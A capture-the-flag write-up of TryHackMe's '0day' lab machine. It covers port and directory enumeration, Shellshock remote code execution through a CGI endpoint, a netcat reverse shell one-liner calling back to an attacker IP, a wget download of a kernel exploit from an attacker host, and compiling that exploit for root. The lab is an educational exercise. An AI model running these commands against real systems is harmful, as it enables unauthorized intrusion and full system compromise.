---
title: "0day - TryHackMe"
date: 2026-04-06 02:00:00 +0000
categories: [TryHackMe, Writeups]
tags: [privilege escalation, CVE-2014-6271, CVE-2015-1328]
image: /assets/img/writeups/covers/0day.jpeg
---
# 0day - TryHackMe
![1.png](/assets/img/writeups/0day/1.png)
**Difficulty**: Medium<br>**Time Required**: 35 min
## Overview
TryHackMe's [0day](https://tryhackme.com/room/0day) room made by Ryan is a Linux-based challenge focused on exploiting a web vulnerability for initial access. Following access, users must enumerate for system misconfigurations and leverage a kernel exploit for privilege escalation. This practical scenario covers the full lifecycle of a zero-day exploit, from web layer exploitation to achieving root access. It serves as an effective exercise for mastering modern vulnerability research techniques.
## Enumeration
Started with an nmap scan: `nmap 10.112.153.204 -T4 -sV -p-`
````
$ nmap 10.112.153.204 -sV -T4    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 11:27 +0500
Nmap scan report for 10.112.153.204 (10.112.153.204)
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.61 seconds
````
Port 80 is open. Visiting it gives us a nice web homepage.
![1.png](/assets/img/writeups/0day/2.png)
I checked the source code and explored all the functionality available on the homepage, but found nothing of interest.<br><br>After running Gobuster, several directories were discovered. However, not all of them were useful.<br><br>**Note:** I used a custom wordlist for directory enumeration [click here](https://raw.githubusercontent.com/onvio/wordlists/master/words_and_files_top5000.txt) to open it.
- The `/backup` directory contained a private SSH key, but it was not usable for gaining access to the machine.
- The `/cgi-bin` directory appeared more interesting.
![1.png](/assets/img/writeups/0day/3.png)

Inside `/cgi-bin`, an endpoint `/cgi-bin/test.cgi` was discovered. After researching online, this endpoint was found to be vulnerable to Shellshock, also known as `CVE-2014-6271`.<br><br>**About the vulnerability**<br>Shellshock is a critical vulnerability in Bash that allows attackers to execute arbitrary commands on the target system by sending specially crafted HTTP headers.
![1.png](/assets/img/writeups/0day/4.png)
## Exploitation
### Remote Code Execution
After searching for exploit for `CVE-2014-6271` on Github I found a [public repository](https://github.com/akr3ch/CVE-2014-6271/blob/main/exploit.py) containing the python script for this exploit I downloaded it and ran it along with the vulnerable URL.
````
$ python script.py http://10.112.153.204/cgi-bin/test.cgi
````
This successfully resulted in Remote Code Execution (RCE).
![1.png](/assets/img/writeups/0day/6.png)

### Gaining Reverse Shell
The next step is to get a stable reverse shell.<br>Start a listner:
````
nc -lvnp 1234
````
Run the reverse shell command:
````

$ sh -i >& /dev/tcp/192.168.153.26/1234 0>&1
````
![1.png](/assets/img/writeups/0day/5.png)
After gaining access, the first flag was located in Ryan’s home directory:
````
$ cat /home/ryan/user.txt
````
![1.png](/assets/img/writeups/0day/7.png)
## Privilege Escalation
Checked for Kernel version:
````
$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
````
The kernel version appeared to be vulnerable.<br><br> After searching about it on google, a matching exploit `37292.c` was found on Exploit-DB.
![1.png](/assets/img/writeups/0day/8.png)
Download this exploit and covert it into Unix format.
````
$ dos2unix 37292.c
````
Then, it was transferred to the target machine using a simple HTTP server:
````
$ python -m http.server 80
````
On the target machine:
````
$ wget http://<attacker-ip>/37292.c
````
Before compiling, the PATH variable needed to be set properly:
````
$ export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
````
After that compile the exploit.
````
$ gcc 37292.c -o exploit
````
![1.png](/assets/img/writeups/0day/9.png)
Execute the compiled exploit.
````
$ ./exploit
````
![1.png](/assets/img/writeups/0day/10.png)
Now it’s your turn to exploit the machine and gain a root shell.
